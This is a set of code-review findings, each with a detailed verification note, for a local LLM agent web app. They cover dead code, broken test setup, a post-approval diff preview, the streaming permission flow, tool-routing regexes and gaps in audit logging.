findings.suggestion: Decide. To finish it: stream the final answer, e.g. a follow-up plain-text call after action 'none', or the local-first answer, as 'token' events in /ask_stream, and use OLLAMA_TIMEOUT. To drop it: remove the stream parameter, _stream_llm_response, its test and the GeneratorType branch.
findings.verification_note:
I checked every claim against the code.

1. **`stream=True` is only used by a test.** `query_llm` is called in two places in the app: `agent.py:145` (`try_local_answer`) and `agent.py:226` (the tool loop). Neither passes `stream`. The only caller with `stream=True` is `tests/test_llm.py:44`. `_stream_llm_response` (`core/llm.py:47-61`) is reached only through `core/llm.py:36`.

2. **`/ask_stream` sends status events, not model tokens.** `core/agent_routes.py:191-195` turns each event from `stream_agent` into one NDJSON line. `_run_steps` (`agent.py:163-341`) only yields these events: `status`, `final_response`, `error` and `permission_required`. Each `query_llm` result is a whole string, so the answer arrives in one piece. The frontend (`static/chat.js:105-124`) also only handles those four event types. It has no handler for token events.

3. **No event ever carries a generator, so the `GeneratorType` branch never runs.**
   - Tool results go into the prompt context (`agent.py:339`), not into events.
   - The calendar result is turned into a plain year/month dict before it is sent.
   - `play_audio_file` (`features/audio/player.py`) only returns plain dicts and lists.
   - The only other generators in the app are internal helpers (`tools/files.py:28 _walk_project`, `tools/verify.py _template_files`), and they never end up in an event.
   - No test calls `normalize_stream_value` or `serialize_stream_event` with a generator.

4. **The timeout is hard-coded.** `core/llm.py:48` uses `timeout=120`, while the non-streaming path (`core/llm.py:38`) uses `OLLAMA_TIMEOUT` (600 by default). One detail is overstated: with `stream=True`, the requests read timeout is the longest wait between received bytes, not a limit on the whole call. So it would fail only when the wait for the first chunk (prompt processing on CPU), or the gap between two chunks, goes over 120s. That is likely with a large prompt on `qwen3-coder:30b` on CPU, but it is not guaranteed.

`git log -S` shows the code came in with commit 28e35be. It is a working feature that nothing in the app uses, so "unfinished" is the right label rather than dead code, and severity low is right.
findings.status_note: Removed: query_llm and its streaming path were deleted, since nothing used them.

findings.title: Root-level leftover files: logs.txt, desktop/__init__.py, check_imports.py, intervju_fordypning.md
findings.detail: logs.txt contains only {"entry": "entry"}; it dates from the initial commit, and core/logger.py writes to local_storage/logs.txt instead. It is dead. desktop/__init__.py is empty and desktop/ has no Python modules, so it has no purpose. check_imports.py is not referenced from README, CLAUDE.md or CI, and pytest in CI already imports every module, so it is redundant unless you run it by hand. intervju_fordypning.md is personal interview-prep notes with CV details, unrelated to the agent. It is committed to git and is surfaced to the LLM by get_project_structure and search_files.
findings.suggestion: Delete logs.txt and desktop/__init__.py. Delete check_imports.py, or document it in README if you use it. Move intervju_fordypning.md out of the repo.
findings.verification_note:
I checked all four files against git history, grep across the repo (README, CLAUDE.md, CI, desktop scripts, tests, registry), and an in-process pytest run that listed sys.modules. Two of the four files really are dead, one is a stray personal file, and check_imports.py is not redundant.

(1) logs.txt is dead. It is tracked and holds only {"entry": "entry"}. core/logger.py:5 has always written to "local_storage/logs.txt" (git log -p confirms), and nothing references the root file. One detail is wrong: the file was added in 724485b ("chore: favicon and icons added"), not in the initial commit 02270ca.

(2) desktop/__init__.py is dead. It is empty and came from the initial commit. desktop/ holds only .bat, .fish and .desktop launchers, and nothing imports a `desktop` package. The launchers themselves are used: agent0-ui.desktop's Exec line points at desktop/start_agent_ui.fish.

(3) check_imports.py is not redundant, and the stated reason is wrong. It is a standalone setup checker (commit e3a9e62, "ready linux and check imports script"). Nothing references it, but it does work that pytest/CI does not. It uses ast.walk, so it also finds imports inside functions. I ran pytest in-process and then checked sys.modules: kokoro and torch are never imported, because features/audio/text_to_speech.py:194 and :201 import them lazily inside a function. tools/verify.py and tools/email.py are not imported by the test run either. check_imports.py does __import__ kokoro and torch (I ran it and every import came back OK), so it catches a broken Kokoro/torch install that the test suite misses. That makes it an undocumented manual dev tool, not dead code. The fix is to document it in README or add it as a CI step, not to delete it.

(4) intervju_fordypning.md is confirmed. It is tracked, it is Norwegian interview prep "basert på CV/søknad" listing skills and experience, and it has nothing to do with the agent. tools/files.py:28-31 `_walk_project` skips only SKIP_DIRS, so get_project_structure (line 41) and search_files (line 75) both expose this root file to the LLM, and read_files can read it. This is a repo-hygiene and privacy problem rather than dead code.
findings.corrected:
Only some of the flagged root files are dead.

- **logs.txt** (tracked; only content is {"entry": "entry"}; added in commit 724485b, not the initial commit) is dead. core/logger.py:5 has always logged to local_storage/logs.txt. Delete it.
- **desktop/__init__.py** (empty, from the initial commit) is dead. desktop/ only contains .bat/.fish/.desktop launcher scripts, which are used, and nothing imports a `desktop` package. Delete only the __init__.py.
- **check_imports.py** is NOT dead or redundant. It is an unreferenced manual dependency checker that covers more than pytest/CI does. features/audio/text_to_speech.py:194/:201 import torch and kokoro lazily inside a function, so the test suite never imports them. tools/verify.py and tools/email.py are never imported by tests either. check_imports.py walks every import with ast, including the ones inside functions, and does __import__ kokoro and torch, so it catches a broken TTS install. Keep it and document it in README.md, or run it as a CI step. Don't delete it.
- **intervju_fordypning.md** is tracked personal interview-prep material (based on a CV/application) and unrelated to the agent. Because tools/files.py:28-31 `_walk_project` only skips SKIP_DIRS, the LLM tools get_project_structure (tools/files.py:41), search_files (:75) and read_files can list and read it. Move it out of the repo, or at minimum untrack it. Severity: low, but it is a privacy/hygiene issue, not dead code.

findings.title: UI leftovers: dead '+' button, unused CSS, class typo, no logout link, unreachable branch, stale comments
findings.detail: The '+' .add-btn (index.html:28) has no handler and no specific styling; it is an unfinished stub. .tts-divider (features/audio/static/audio.css:272) is used nowhere; it was left behind when the collapsible sections replaced it. 'tss-field' (features/audio/templates/audio/tts_dashboard.html:119) is a typo for tts-field, so that <details> misses its styling. No page links to /logout, so the logout page can only be reached by typing the URL. core/auth.py:22-23 is unreachable: is_logged_in raises instead of returning a falsy value. Stale comments: calendar.js:1-4 points at core/ui.py and a 'main inline script' (now core/agent_routes.py and chat.js), and features/audio/routes.py:55 refers to tools.audio.play_audio_file (now features.audio.player).
findings.suggestion: Wire up or remove the + button. Delete .tts-divider. Fix the tss-field typo. Add a logout link. Replace lines 22-23 with a plain call to is_logged_in, or drop it. Update the stale comments.
findings.verification_note: I checked each sub-claim against the code and all of them hold, but the bundle mixes dead code with unfinished features. (1) templates/index.html:28 `.add-btn`: the class appears nowhere else in the repo. There is no JS binding: chat.js only listens for the form submit and #input keydown, and speech.js only selects .mic-btn. The only styling is the generic .icon-btn in static/styles.css:93. The button was added in 482f886 ("task: update UI") and never wired up, so it is UNFINISHED, not dead. (2) .tts-divider (features/audio/static/audio.css:272): no references anywhere. git history shows the two `<div class="tts-divider">` were removed from the template in 5f2c6e8 when the collapsibles arrived, so this is truly dead CSS. (4) /logout: grep finds no href or JS navigation to /logout. Only templates/logout.html posts to it, and core/auth.py:58 serves it. The route works but nothing links to it, so this is UNFINISHED navigation, not dead code. (5) core/auth.py:22-23: is_logged_in (lines 11-14) either raises HTTPException(401) or returns the Request, which is truthy, so `if not await is_logged_in(...)` can never be true. The behaviour is still correct, because core/ui.py:47-52 has an exception handler that turns 401 into a 303 to /login. That makes it a harmless unreachable branch, not a bug. In fact show_calendar is emitted from core/agent_routes.py:187 and agent.py:334, the call is in static/chat.js:117, and index.html has no inline script. calendar.js is loaded before chat.js (index.html:81-82). features/audio/routes.py:55 names tools.audio.play_audio_file, but tools/audio.py does not exist; the function is features.audio.player.play_audio_file (registry.py:67). findings.title: pytest writes test events into the real local_storage/logs.txt
findings.detail: LOG_FILE is a relative path, and no test redirects it. Every pytest run appends fake events to the user's runtime log, for example 'Team sync' create_calendar_event executions and repeated decisions from test_ui_permission_flow; the baseline run at 15:09:40 today added them. That skews any log-based analysis of real tool usage.
findings.suggestion: Add a tests/conftest.py autouse fixture that monkeypatches core.logger.LOG_FILE to tmp_path / 'logs.txt'.
findings.verification_note:
The finding is accurate.
- core/logger.py:5 sets `LOG_FILE = "local_storage/logs.txt"`, a path relative to the current directory. `log_event` (lines 7-19) appends to that file on every call.
- There is no tests/conftest.py, pytest.ini, pyproject.toml or setup.cfg in the repo.
- No test file mentions `log_event`, `LOG_FILE` or `logger`. The only `monkeypatch` uses in tests are for login helpers and TTS, and nothing calls `chdir`.
- agent.py calls `log_event` at lines 146, 228, 317, 352 and 376. So every agent-flow test run from the repo root writes into the real runtime log.

The log itself backs this up:
- Lines 2060-2091 of local_storage/logs.txt all have the timestamp 2026-10-15T15:09:40.78-.80. Their inputs match the test fixtures: "largest mountain", "callendar", "schedule a team sync", and the 'Team sync' create_calendar_event decision from tests/test_agent_flow.py:107.
- "Team sync" appears 677 times in the log, so this has built up over many test runs.

The suggested fix works. agent.py imports the `log_event` function, not `LOG_FILE`. `log_event` looks up the module-level `LOG_FILE` each time it is called, so an autouse fixture doing `monkeypatch.setattr(core.logger, "LOG_FILE", str(tmp_path / "logs.txt"))` would redirect every write. `os.makedirs(os.path.dirname(...))` still works with that path. The fix only changes test setup and touches no contract shared across files.

findings.title: The documented `pytest` command fails: every test module errors at collection
findings.detail: CLAUDE.md:34 says to run `pytest`, and .claude/settings.json allow-lists `Bash(pytest)` and `./venv/bin/pytest`. The repo has no pytest.ini, pyproject.toml or root conftest.py. Bare `pytest` (the venv/bin/pytest entry point) does not put the repo root on sys.path. Verified: `source venv/bin/activate && pytest -q` gives 'ModuleNotFoundError: No module named core/tools' and 'Interrupted: 7 errors during collection'. Only `python -m pytest`, which README and CI use, works because it adds the working directory to sys.path. Anyone following CLAUDE.md, including Claude, will conclude the code is broken.
findings.suggestion: Add a pytest config, e.g. pyproject.toml `[tool.pytest.ini_options] pythonpath = ["."]`, `testpaths = ["tests"]`, or an empty root conftest.py. The same config is a natural place for an autouse fixture that sends core.logger.LOG_FILE to tmp_path.
findings.verification_note:
I reproduced it. The repo has no pytest.ini, pyproject.toml, setup.cfg, tox.ini, root conftest.py, tests/conftest.py or tests/__init__.py. `PYTHONPATH` is empty, no shell profile sets it, and the venv has no .pth file that adds the repo root (the only one is distutils-precedence.pth). In the default prepend import mode, pytest puts only `tests/` on sys.path, because `tests/` is not a package.

- Running `source venv/bin/activate && pytest -q`, which resolves to venv/bin/pytest, fails at collection. It raises `ModuleNotFoundError: No module named 'features'` and `'tools'`, and the run ends with "Interrupted: 7 errors during collection". All 7 test modules fail: test_agent_flow, test_audio_tool, test_calendar, test_llm, test_speech_routes, test_text_to_speech and test_web_tools.
- `python -m pytest -q` passes 121 tests, because `-m` adds the working directory to sys.path.
- The commands disagree across files. CLAUDE.md:34 says `pytest`. README.md:61 says `python -m pytest`. .github/workflows/tests.yml:58 says `xvfb-run -a python -m pytest -q`. .claude/settings.json allow-lists `Bash(pytest)`, `Bash(pytest:*)` and `Bash(./venv/bin/pytest:*)`, and the first and last of these hit this failure.

No guard elsewhere prevents it. The only caveat is that this is a developer-tooling and documentation defect, not a runtime bug in the app, so "medium" is at most the right severity. The suggested fixes (`pythonpath = ["."]` in a pytest config, or an empty root conftest.py) are valid. Changing the doc line to `python -m pytest` would also fix it.
findings.status_note: CLAUDE.md now says python -m pytest. No pytest config was added, so bare pytest still fails.

findings.title: The 'diff preview before file writes' runs after approval and only prints to the server console
findings.detail: README.md:16 says 'diff preview before file writes'. core/diff.py's generate_diff is only called inside write_file/edit_file (tools/files.py:357-362, 425-428). Those run after request_permission has already approved (agent.py:289-309). The diff is printed to stdout and the file is written on the next line, with no chance to cancel. In the web flow the permission card (permission_card.html:18) shows only the raw args JSON. For write_file that means the full new content with no diff. For extract_inline_scripts, which rewrites an HTML file and creates a JS file, the approver only sees {"path": "templates/index.html"}. In the CLI the prompt prints the raw args, and the diff appears only after the user has typed y.
findings.suggestion: Add a dry-run step for the file-writing tools: compute the would-be content and diff before request_permission, carry it on PermissionRequired / the permission_required event, and render it in permission_card.html and the CLI prompt. Drop the post-approval print. Otherwise remove the README claim.
findings.verification_note:
I checked every part of the claim against the code. README.md:16 advertises "diff preview before file writes". The only caller of core/diff.py's generate_diff is tools/files.py: write_file at lines 357-360 and edit_file at lines 425-426. Both print the diff, cut to 2000 characters, to stdout and then call _backup_and_write on the very next line (362 and 428), so the user gets no chance to cancel.

These functions only run through execute_tool at agent.py:309, which comes after request_permission at agent.py:289 has returned True. So the diff is only produced once the action is already approved.

In the CLI, core/permission.py prints Action, Risk and the raw args, then calls input("Approve? (y/n)"). The diff appears only after the user types y.

In the web flow, PermissionRequired carries only action, args, risk and reason (core/permission.py:5-11; agent.py:291-298). static/chat.js:48 sets perm-args to JSON.stringify(eventData.args), and templates/components/permission_card.html:18 renders {{ p.args }}. Neither has a diff field. Once approved, the diff goes to uvicorn's stdout, which the web user never sees.

extract_inline_scripts (tools/files.py:156-231) never calls generate_diff at all, yet it rewrites the HTML file and creates or overwrites a JS file. Its approval card shows only {"path": ...}, as the shortcut at agent.py:100-106 shows.

No tests exercise the preview, and it has been this way since the initial commit. The feature is described but not wired into the approval step, so "unfinished" is the right classification. Medium severity is fair, because a documented safety feature does not actually protect anything. The suggested fix would change the PermissionRequired / permission_required event shape and the permission card, so it counts as a design change.

findings.title: A streamed request can't resume after approval and falls back to the blocking full-page /ask
findings.detail: /ask_stream reads only `input` (core/agent_routes.py:156-157) and calls stream_agent(user_input) with no decisions (line 192). The permission card's form posts to /ask (permission_card.html:20), and chat.js never intercepts it (it only binds #main-chat-form). Clicking Approve or Reject therefore does a full-page POST to /ask, where run_agent runs the entire re-run inside that one request. The user sees no status events and no thinking indicator, just a pending page load for several LLM calls, each allowed up to OLLAMA_TIMEOUT=600s, before anything renders. Reject also re-runs every earlier LLM step just to print 'Action denied'.
findings.suggestion: Intercept #stream-permission-form in chat.js and resubmit to /ask_stream with permission_action/permission_decision (plus args once approvals are bound to args). In ask_stream, call create_permission_decisions(form) and pass the result to stream_agent. Keep /ask only as the no-JS fallback.
findings.verification_note: I checked each part of the premise against the code. templates/components/permission_card.html:20 has `<form id="stream-permission-form" method="post" action="/ask">`, and the Approve and Reject buttons at lines 26-27 submit `permission_decision=y/n`. The only submit listener in static/chat.js is on `#main-chat-form` (lines 130-134). No JS file anywhere binds `#stream-permission-form`. I grepped static/, features/*/static and templates. The permission card sits outside `#main-chat-form` in templates/index.html, so that listener cannot catch it either. As a result, Approve and Reject do a native full-page POST to /ask. ask_stream (core/agent_routes.py:154-195) reads only `input` and calls `stream_agent(user_input)` at line 192 with no decisions. stream_agent (agent.py:374-383) already accepts `permission_decisions`, but it is never given any. /ask (agent_routes.py:116-119) builds `{action: bool}` with create_permission_decisions and calls `run_agent`, which drains the whole `_run_steps` before it returns. That means a re-run of try_local_answer and every LLM step. query_llm uses OLLAMA_TIMEOUT, which defaults to 600 (core/llm.py:24,38). On Reject, request_permission returns `bool(decisions[action])` = False (core/permission.py:26-27). `_run_steps` then yields "Action denied" (agent.py:300-302), but only after redoing all the earlier steps. The rerun is non-deterministic, so it may not reach the same action at all and can show a new card instead. The suggested fix is workable and breaks nothing: stream_agent already takes decisions, and /ask can stay as the no-JS fallback (tests/test_agent_flow.py:102-128 exercise /ask, so keeping it preserves them). Two details for whoever implements it. First, `/ask` is `async def` but calls the blocking `run_agent`/`requests.post` directly, so the current fallback stalls the whole event loop and every other request, not only this page load. Second, the JS intercept must build `new FormData(form, e.submitter)`, or the clicked button's `permission_decision` value is lost.
findings.status_note: chat.js intercepts the permission card and resumes over /ask_stream, sending only the run id.

findings.title: needs_tools still skips the local answer for some ordinary questions
findings.detail: FILE_TASK_RE matches any `.js/.md/.txt...` suffix or the bare words file/project/template/folder/directory/repo. Verified: 'What is node.js?', 'How do I rename a file in Linux?', 'Give me a cover letter template' and 'What's a good name for my project?' all return True. These general-knowledge questions skip try_local_answer (qwen3:8b) and go straight to the tool loop on OLLAMA_CODE_MODEL (qwen3-coder:30b) with the full tool prompt. That prompt says 'ALWAYS search first when unsure', so the model can run auto-approved get_project_structure/search_files on the user's repo to answer a Linux how-to.
findings.suggestion: Only short-circuit when the text names something that resolves to a real project path (reuse tools.files._resolve_project_file), or require project context such as 'this/my project', 'in the repo' or an explicit path. Otherwise let the local-first model decide.
findings.verification_note:
I traced the code path and the finding holds. agent.py:47-55 defines FILE_TASK_RE, which matches any `.py/.html/.css/.js/.json/.md/.txt/...` suffix or the bare words file(s)/project/codebase/repo(sitory)/template(s)/folder/directory. agent.py:190 then skips try_local_answer whenever needs_tools() returns True.

Running needs_tools() in the venv returned True for every input the reviewer named, and also for 'What is a git repository?', 'What is README.md?', 'What is Vue.js' and 'how do i make a directory in windows'. 'tell me a joke' returned False.

Nothing upstream catches these inputs first. In core/agent_routes.py, /ask and /ask_stream only run their shortcuts before calling run_agent/stream_agent: parse_note_command, parse_create_command, parse_play_command and is_calendar_request. All four return None/False for the reviewer's inputs.

I ran _run_steps with query_llm and log_event replaced by in-memory fakes, so nothing was written to disk. 'What is node.js?' emitted 'This needs the project tools, skipping the local model...' and made exactly one LLM call, to qwen3-coder:30b. 'tell me a joke' went to the default model (qwen3:8b) via try_local_answer.

The tool-loop prompt includes SYSTEM_PROMPT, which says 'ALWAYS search first when unsure'. config/settings.py RULES sets get_project_structure, search_files and read_files to 'auto', so request_permission returns True for them without asking.

No test covers needs_tools or the skip branch; tests/test_agent_flow.py only mocks the local-first reply as needs_tools. The regex is also broader than its own comment, which says it targets 'Requests that talk about project files'.

One caveat on impact: the code model may still answer such a question directly with action 'none'. So the guaranteed cost is a slow 30B CPU call with the full tool prompt instead of the 8B local-first path. Auto-approved repo scans and reads are a likely but not certain side effect, and they stay local and read-only. Medium severity is reasonable for a wrong routing decision on common general-knowledge questions.
findings.status_note: The blanket file-task regex was replaced by narrower determiner/verb patterns (agent.py). Still wide: '.js' matches 'What is node.js?', and any snake_case word or `word()` sends the question to the code model. Originally reported as: needs_tools treats ordinary questions as file tasks and skips the local answer

findings.title: Shortcut actions (notes, calendar, play) leave no audit trail
findings.detail: log_event is only called in agent.py, for user_input, llm_raw_decision and tool_execution. Verified in local_storage/logs.txt: those are the only 3 event types across 2221 lines. Nothing is logged for: shortcut writes in core/agent_routes.py (calendar create_event, save_note_text, play), since run_agent/stream_agent are never reached so even the input is missing; permission approvals and denials (core/permission.py); 'Action denied' and 'Max steps' outcomes; error events; final responses; /speech transcriptions and voice notes; TTS generation and conversion. Example: 'add a meeting on 4th october at 12' from the web UI writes to my_calendar.ics and leaves zero log lines. The log also has no rotation (628KB so far) and stores raw LLM output, including full write_file contents and 500-char tool-result previews.
findings.suggestion: Log at the request boundary in core/agent_routes.py and core/speech_routes.py (input plus which shortcut ran), log every permission decision with action and args in request_permission, and log final_response/error events in _run_steps. Add size-based rotation (logging.handlers.RotatingFileHandler) or fix the README claim.
findings.verification_note:
I checked each claim against the code and found them accurate.

- README.md:19 says "All actions logged to `local_storage/logs.txt`".
- core/logger.py::log_event is the only logging mechanism. No module uses the `logging` stdlib.
- grep finds log_event called only in agent.py:
  - :146, the local_first llm_raw_decision
  - :228, llm_raw_decision
  - :317, tool_execution
  - :352 and :376, user_input
- local_storage/logs.txt has 2221 lines and contains exactly three event types: llm_raw_decision 1449, user_input 430 and tool_execution 342.

On the web path, core/agent_routes.py runs shortcut_text_response (:91 and :164), audio_play_result (:99 and :170) and is_calendar_request before it reaches run_agent or stream_agent. These shortcuts call create_event, save_note_text and play_audio_file, and features/, tools/ and core/speech_routes.py contain no log_event calls. As a result, nothing is logged for them, not even the input. I ran parse_create_command('add a meeting on 4th october at 12') and it returns {'title': 'Meeting', 'start': 2026-10-04 12:00}, so the README example really does write to the calendar and leaves no log line. (On the CLI, run_agent logs user_input before _run_steps, so only the outcome is missing there. The finding correctly limits its claim to the routes.)

The following are also never logged:
- **Permission decisions:** core/permission.py::request_permission does not log approvals or denials.
- **Outcomes in _run_steps:** "Action denied" (:305), "Max steps" (:341), error events (:270 and :301) and final_response events.
- **Speech-to-text:** /speech transcriptions and voice notes (core/speech_routes.py:23).
- **TTS endpoints.**

Logging has no rotation: log_event appends with open(LOG_FILE, "a"). The file is now 640,496 bytes, which is about 625 KiB, so "628KB" is a negligible difference. Raw LLM output is stored verbatim; for example, line 2143 holds the full write_file content in raw. tool_execution stores the full args and result_preview[:500].

The suggestion would not break anything. It only adds log calls, or else corrects the README.
findings.status_note:
Permission decisions, denials, tool errors and stream errors are now logged. Shortcut actions still are not.

Originally reported as: 'All actions logged' is false: shortcuts, approvals, errors and outcomes leave no audit trail

findings.title: /speech still has no tests
findings.detail: test_ui_permission_flow asserts `"Permission Required" in response.text` (line 118). That heading is in permission_card.html:10 on every page, and GET / contains it too (verified). Line 133 asserts `"Team sync" in text or "Response" in text`, and 'Response :' is rendered for any non-empty response. Reproduced: the approved request runs the tool once, then the duplicate-call guard loops until 'Max steps reached without conclusion.' after 9 LLM calls, and the test still passes. Separately, tests/test_speech_routes.py tests features/audio/routes.py (/tts*), not core/speech_routes.py. Despite CLAUDE.md's 'tests mirror the module layout' note, /speech, tools/notes.py, core/permission.py, core/streaming.py and tools/verify.py have no direct tests. That is how the voice-note double-save shipped.
findings.suggestion: Assert on what actually ran: the create_event mock was called once with the expected args, and the final text is what the LLM's 'none' step returned (feed a scripted decision sequence ending in action none). Add unit tests for request_permission (auto/ask/decisions/denied) and serialize_stream_event, plus a /speech test with transcribe_audio stubbed. Rename test_speech_routes.py to test_audio_routes.py.
findings.verification_note:
I ran a scratchpad copy of the test, instrumented, and read the code. Most of the finding holds up.

What checks out:
- templates/components/permission_card.html:10 renders "Permission Required" on every page; it is only hidden with a CSS class. GET / contains the heading, so the assertion at tests/test_agent_flow.py:118 proves nothing.
- On the approved request, the stubbed create_event runs once with ("Team sync", "2026-09-10 10:00"). The mocked LLM keeps returning the same decision, so the duplicate-call guard in agent.py:276-283 runs `continue` until agent.py:341 returns "Max steps reached without conclusion.". That takes 9 query_llm calls: 1 local-first call plus 8 steps.
- The rendered response is exactly that max-steps text, and "Team sync" does not appear in the page. Line 133 passes only through the "Response" fallback, because templates/index.html:61 renders "Response :" for any non-empty response.
- This is the only test that exercises a permission gate. The search_web decisions at line 38 have no effect because search_web is "auto" in config/settings.py.
- tests/test_speech_routes.py imports features.audio.routes and only calls the /tts* endpoints. No test references /speech, tools/notes.py (parse_note_command, save_note_text), request_permission, serialize_stream_event or tools/verify.py. request_permission and serialize_stream_event only run indirectly through /ask and /ask_stream.
- The voice-note double-save is a real latent bug. core/speech_routes.py:21-24 saves the note. static/speech.js:42 then puts the same "note ..." transcript into the input box. When the user submits it, core/agent_routes.py:44-47 (shortcut_text_response) saves it a second time.

What is overstated:
- "The test can't fail" is wrong for the first half. Line 119 asserts "create_calendar_event" in response.text, and GET / does not contain that string. It only shows up when the permission card is filled in, so that half really does check that permission was requested.
- Only line 118 (vacuous) and line 133 (passes on a broken outcome) are weak. Line 133 can still fail on an exception, which renders the error card with no "Response", or on an empty response.
- The max-steps loop comes from how the test is built (a mock that returns the same decision forever). It is not a product bug.
- "That is how the double-save shipped" is speculation about cause. The bug also only triggers if the user submits the filled-in transcript.

The suggested fixes are sound and break nothing. None of them changes a contract used across files.
findings.corrected: In test_ui_permission_flow (tests/test_agent_flow.py:102-133), the post-approval half asserts nothing useful. Line 133 (`"Team sync" in text or "Response" in text`) passes for any non-empty response. Today the approved request runs the stubbed create_event once. Because the mocked LLM keeps repeating the same decision, the duplicate-call guard (agent.py:276-283) then loops until agent.py:341 returns "Max steps reached without conclusion." after 9 query_llm calls, and the test still passes. Line 118 is also vacuous: permission_card.html:10 puts "Permission Required" on every page, including GET /. Line 119 (`"create_calendar_event" in text`) does check that the permission card was filled in, so the first half of the test is not useless. Fix: feed a scripted decision sequence for the second request (needs_tools, then create_calendar_event, then none) and assert that create_event was called once with the expected args and that the "none" response text is rendered. Separately, tests/test_speech_routes.py covers features/audio/routes.py (/tts*), not core/speech_routes.py. /speech, tools/notes.py, core/permission.request_permission (auto/risk fallback/decisions/raise), core/streaming.serialize_stream_event and tools/verify.py have no direct unit tests; request_permission and serialize_stream_event are only exercised indirectly through /ask and /ask_stream. A latent bug sits in that untested area: /speech saves a "note ..." transcript (core/speech_routes.py:21-24), and static/speech.js:42 puts the same text into the input box, so submitting it saves the note again (core/agent_routes.py:44-47). Add the unit tests, a /speech test with transcribe_audio stubbed, and optionally rename test_speech_routes.py to test_audio_routes.py.
findings.status_note:
The permission, notes and streaming flows now have tests, including multi-approval runs. /speech still has none.
